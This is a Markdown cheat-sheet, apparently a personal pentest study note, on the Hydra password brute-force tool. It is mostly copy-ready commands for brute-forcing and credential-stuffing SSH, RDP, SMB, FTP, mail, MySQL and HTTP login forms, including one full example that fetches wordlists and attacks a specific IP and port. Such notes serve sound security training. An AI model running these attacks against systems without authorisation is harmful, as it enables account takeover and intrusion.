---
tags: [basics, tool, brute-force]
---


> [!info] See also: [[Techniques/Password Cracking/Password Attacks]] · [[Password Cracking]]

Tool which can be used for bruteforcing.

## Syntax 

```bash
hydra [login_options] [password_options] [attack_options] [service_options]
```

## Basic usage 
```bash
# Basic command to attack ssh
hydra -L user.list -P password.list ssh://10.2.81.197

# Attacking RDP
hydra -L user.list -P password.list rdp://10.2.81.197

# Attacking SMB 
hydra -L user.list -P password.list smb://10.2.81.197


# Credential Stuffing with file,that contains username:password
hydra -C user_pass.list ssh://10.12.128.4

# Multiple Targets in parallel
hydra -l root -p toor -M targets.txt ssh

# Single Target with userlist/passwordlist (without proto:// syntax)
hydra -L usernames.txt -P passwords.txt www.example.com http-get

# Non-standard port using -s
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp

# Advanced RDP brute force with character set range
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp

# Cracking Basic HTTP Authentication on a non standard port
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```


## HTTP POST Form Brute Forcing

Use the `http-post-form` module with a triplet `path:params:condition_string`. The condition can be a `S=` (success) or `F=` (failure) string.

```bash
hydra [options] target http-post-form "path:params:condition_string"

# Failure-based condition
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"

# Success-based condition (HTTP redirect)
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS:S=302"
```

End-to-end example using common wordlists:
```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.55.234 -s 44364 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```


## Service-Specific Examples 

```bash
# FTP
hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100

# SSH
hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100

# Web form (path/params + failure string)
hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# SMTP
hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com

# POP3
hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com

# IMAP
hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com

# MySQL
hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100

# RDP
hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100
```

Useful flags:
- `-f` — stop after first valid credential
- `-V` — verbose; show every attempt
- `-s <port>` — non-standard port
- `-M <file>` — multiple targets
- `-C <file>` — colon-separated combo list (`user:pass`)
